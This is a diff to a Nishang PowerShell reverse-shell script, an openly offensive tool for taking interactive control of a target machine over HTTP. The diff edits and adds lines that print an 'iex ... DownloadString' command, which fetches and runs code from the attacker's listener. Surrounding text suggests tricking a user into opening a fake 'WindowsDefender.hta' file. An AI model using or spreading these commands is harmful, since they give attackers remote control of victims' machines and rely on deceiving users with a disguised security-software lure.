@@ -8,7 +8,7 @@ Nishang script which can be used for Reverse interactive PowerShell from a targe
 This script starts a listener on the attacker's machine. The listener needs a port to listen.
 
 On the target machine execute the below command from PowerShell:
-iex (New-Object Net.WebClient).DownloadString("http://IPAddress/connect")
+iex (New-Object Net.WebClient).DownloadString("http://ListenerIPAddress/connect")
 
 or trick a user in connecting to: http://IPAddress/WindowsDefender.hta
 
@@ -71,6 +71,9 @@ https://github.com/samratashok/nishang
 
         $listener.Start()
         Write-Output "Listening on $Port"
+        Write-Output "Run the following command on the target:"
+        Write-Output "iex (New-Object Net.WebClient).DownloadString(""http://$IPAddress`:$Port/connect"")"
+
         while ($true) 
         {
             $context = $listener.GetContext() # blocks until request is received
